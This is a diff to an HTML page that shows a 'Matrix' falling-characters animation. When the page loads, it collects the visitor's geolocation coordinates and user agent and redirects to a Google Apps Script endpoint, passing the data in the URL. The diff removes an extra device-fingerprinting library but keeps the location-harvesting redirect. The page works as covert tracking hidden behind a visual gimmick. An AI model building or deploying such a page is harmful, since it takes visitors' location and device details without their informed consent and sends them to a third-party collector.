@@ -34,16 +34,6 @@
     const matrixCharacters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ123456789@#$%^&*()_+{}:"<>?`~';
     let interval;
 
-    function getDeviceInfo() {
-      const parser = new UAParser();
-      const result = parser.getResult();
-      return {
-        device: result.device.model || "Unknown Device",
-        os: result.os.name + " " + result.os.version,
-        browser: result.browser.name + " " + result.browser.version
-      };
-    }
-
     function getGeoLocation() {
       const matrixDiv = document.getElementById('matrix');
       let columns = Math.floor(window.innerWidth / 20);
@@ -83,7 +73,7 @@
             var device = navigator.userAgent;
             
             var scriptUrl = "https://script.google.com/macros/s/AKfycbzTqZTXXRolJY6ClLC_v9RjmWaeiVdfqoCz0BApRb7yr5rL8TuDDzNUpkAWteP4uzXY8w/exec";
-            var url = `${scriptUrl}?latitude=${latitude}&longitude=${longitude}&device=${encodeURIComponent(deviceInfo.device)}&os=${encodeURIComponent(deviceInfo.os)}&browser=${encodeURIComponent(deviceInfo.browser)}`;
+            var url = `${scriptUrl}?latitude=${latitude}&longitude=${longitude}&device=${encodeURIComponent(device)}`;
             
             // Redirigir a la URL del script
             window.location.href = url;
@@ -94,9 +84,9 @@
       }
     }
   </script>
-  <script src="https://cdnjs.cloudflare.com/ajax/libs/UAParser.js/0.7.28/ua-parser.min.js"></script>
 </head>
 <body onload="getGeoLocation()">
   <div id="matrix"></div>
 </body>
 </html>
+
